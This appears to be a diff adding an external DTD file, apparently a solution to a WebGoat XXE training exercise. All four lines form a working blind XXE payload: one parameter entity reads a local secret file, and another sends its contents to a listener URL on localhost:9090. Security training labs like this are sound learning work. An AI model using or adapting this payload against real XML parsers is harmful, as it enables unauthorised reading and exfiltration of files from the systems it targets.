@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///root/.webgoat-2023.4//XXE/grupo-03-facundo-matias/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://localhost:9090/landing?file=%file;'>">
+%eval;
+%exfiltrate;
